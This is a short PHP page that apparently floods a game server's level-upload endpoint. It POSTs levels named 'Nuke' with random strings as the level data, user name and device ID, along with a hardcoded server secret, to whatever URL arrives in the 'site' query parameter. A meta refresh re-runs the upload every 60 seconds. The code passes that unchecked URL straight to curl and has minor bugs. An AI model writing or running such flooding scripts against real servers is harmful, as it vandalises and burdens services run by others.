<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<style>
    .a {
        display: inline-block;
        padding: 5px;
        border: 1px solid black;
    }
</style>
<p>Response:</p>
<?php
echo "<script>
function a() {
location.reload();
}
setTimeout(a, 60000);
</script>";
                $is = $_GET["site"];
                function generate($how_long)
                {
                    $length = $how_long;
                    $chars = 'abdefhiknrstyzABDEFGHKNQRSTYZ23456789';
                    $numChars = strlen($chars);
                    $string = '';
                    for ($i = 0; $i < $length; $i++) {
                        $string .= substr($chars, rand(1, $numChars) - 1, 1);
                    }
                    return $string;
                }
                $r = generate(10);
                $r2 = generate(10);
                $r3 = generate(10);
                $a = check($is, 10, $r, $r2, $r3);
                if ($a == "") {
                    echo "Can't send request to server";
                } else {
                    if ($a > 1) {
                        $b = "Succes! ID: $a";
                      }
                    }

echo "<div class='a'>$b</div>";
                function check($is, $id, $r, $r2, $r3)
                {
                    $k = $GLOBALS["key"];
                    if ($curl = curl_init()) {
                        curl_setopt($curl, CURLOPT_URL, $is);
                        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                        curl_setopt($curl, CURLOPT_POST, true);
                        curl_setopt($curl, CURLOPT_POSTFIELDS, "gameVersion=21&levelString=$r&gjp=$r2&extID=1&secret=Wmfd2893gb7&udid=$r3&levelName=Nuke $r&levelDesc=nuke&userName=$r2&levelVersion=1&levelLength=50&audioTrack=1");
                        $out = curl_exec($curl);
                        return $out;
                        curl_close($curl);
                    }
                }
                if ($a > 0) {
                    echo "";
                }
?>
